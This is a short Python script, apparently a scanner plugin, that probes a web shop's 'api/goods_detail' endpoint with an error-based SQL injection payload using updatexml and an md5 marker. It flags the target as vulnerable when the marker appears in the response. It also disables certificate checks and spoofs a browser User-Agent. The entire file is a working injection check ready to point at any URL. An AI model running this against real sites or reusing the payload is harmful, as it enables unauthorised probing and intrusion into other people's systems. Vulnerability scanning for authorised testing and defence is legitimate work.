import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def substr(strs,s,lens):
	result=strs[s:lens]
	return result
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(200000000, 210000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5("+str(rand)+"),0x7e),1)"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 404 and substr(md5(str(rand).encode()).hexdigest(), 0, 31) in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
